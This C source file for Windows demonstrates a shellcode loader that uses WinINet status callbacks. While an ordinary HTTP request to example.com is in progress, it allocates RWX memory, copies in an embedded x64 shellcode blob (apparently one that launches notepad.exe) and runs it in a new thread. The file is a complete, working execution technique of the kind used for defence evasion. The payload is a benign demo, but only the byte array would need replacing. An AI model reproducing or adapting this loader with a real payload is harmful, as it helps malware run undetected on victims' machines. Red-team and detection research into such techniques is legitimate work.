/*

    This module uses InternetSetStatusCallback() to demo how we run certain functions based on things
    like: DNS name resolution, when we reach out to a certain server, when we send/receiver certain number
    of bytes, when connections are terminated, etc etc

    Tested on: Windows 11 24H2
    Author: @whokilleddb

*/
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#define UNUSED(x) (void)(x)

// notepad.exe shellcode
unsigned char shellcode[] =  {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x6e, 0x6f, 0x74, 0x65, 0x70,
    0x61, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00
};

DWORD shellcode_size = 0;
LPVOID exec_addr = NULL;
HANDLE hThread = NULL;

// Status callback function
void CALLBACK InternetStatusCallback(
    HINTERNET hInternet,
    DWORD_PTR dwContext,
    DWORD dwInternetStatus,
    LPVOID lpvStatusInformation,
    DWORD dwStatusInformationLength
)
{
    UNUSED(hInternet);
    UNUSED(dwContext);
    UNUSED(dwStatusInformationLength);

    switch (dwInternetStatus)
    {
    case INTERNET_STATUS_RESOLVING_NAME: 
        if (lpvStatusInformation) printf("[+] Resolving name as:\t\t%S\n", (LPCWSTR)lpvStatusInformation);
        // calculate shellcode size 
        shellcode_size = sizeof(shellcode);
        printf("[+] Shellcode size:\t\t%ld\n", shellcode_size);
        break;

    case INTERNET_STATUS_NAME_RESOLVED:
        if (lpvStatusInformation) printf("[+] Name resolved as:\t\t%s\n", (LPCSTR)lpvStatusInformation);
        // Create RWX memory
        exec_addr = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        printf("[+] Allocated RWX memory to:\t0x%p\n", exec_addr);
        break;

    case INTERNET_STATUS_CONNECTING_TO_SERVER:
        printf("[+] Connecting to server\n");
        memcpy(exec_addr, shellcode, shellcode_size);
        break;

    case INTERNET_STATUS_CONNECTED_TO_SERVER:
        if (lpvStatusInformation) printf("[+] Connected to server: %s\n", (LPCSTR)lpvStatusInformation);   
        DWORD tid;
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_addr, NULL, 0, &tid);
        break;

    case INTERNET_STATUS_SENDING_REQUEST:
        printf("[+] Sending request to server\n");
        break;

    case INTERNET_STATUS_REQUEST_SENT:
        printf("[+] Sent %ld bytes as request\n", *(DWORD*)lpvStatusInformation);
        CloseHandle(hThread);
        break;

    case INTERNET_STATUS_RECEIVING_RESPONSE:
        printf("[+] Receiving response from the server\n");
        break;

    case INTERNET_STATUS_RESPONSE_RECEIVED:
        printf("[+] Received %ld bytes as response\n", *(DWORD*)lpvStatusInformation);
        break;

    case INTERNET_STATUS_REQUEST_COMPLETE:
        printf("[+] Request complete\n");
        break;

    case INTERNET_STATUS_CLOSING_CONNECTION:
        printf("[+] Closing connection\n");
        break;

    case INTERNET_STATUS_CONNECTION_CLOSED:
        printf("[+] Closed connection\n");
        break;

    default:
        break;
    }
}

int main()
{
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;

    // Initialize WinINet
    hInternet = InternetOpenA(
        "WinINet Status Callback Example/1.0",
        INTERNET_OPEN_TYPE_DIRECT,
        NULL,
        NULL,
        0
    );

    if (!hInternet)
    {
        printf("[-] InternetOpen failed: 0x%lx\n", GetLastError());
        return 1;
    }

    // Set the status callback
    INTERNET_STATUS_CALLBACK previousCallback = InternetSetStatusCallback(
        hInternet,
        InternetStatusCallback
    );

    if (previousCallback == INTERNET_INVALID_STATUS_CALLBACK)
    {
        printf("[-] InternetSetStatusCallback failed: 0x%lx\n", GetLastError());
        InternetCloseHandle(hInternet);
        return 1;
    }

   printf("[+] Status callback set successfully!\n");
    
    // Connect to a server
    hConnect = InternetConnectA(
        hInternet,
        "www.example.com",
        INTERNET_DEFAULT_HTTP_PORT,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        1 
    );

    if (!hConnect)
    {
        printf("[-] InternetConnect failed: 0x%lx\n", GetLastError());
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Open an HTTP request
    hRequest = HttpOpenRequestA(
        hConnect,
        "GET",
        "/",
        NULL,
        NULL,
        NULL,
        INTERNET_FLAG_RELOAD,
        2 
    );

    if (!hRequest)
    {
        printf("[-] HttpOpenRequest failed: 0x%lx\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Send the request 

    if (HttpSendRequest(hRequest, NULL, 0,NULL, 0))
    {
        // Read some response data
        printf("[+] Request sent successfully!\n");

        char buffer[1024];
        DWORD bytesRead = 0;
        InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead);
    }
    else
    {
        printf("[-] HttpSendRequest failed: 0x%lx\n", GetLastError());
        
    }

    // Clean up
    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);

    // Remove callback before closing the main handle
    InternetSetStatusCallback(hInternet, NULL);

    if (hInternet) InternetCloseHandle(hInternet);

    return 0;
}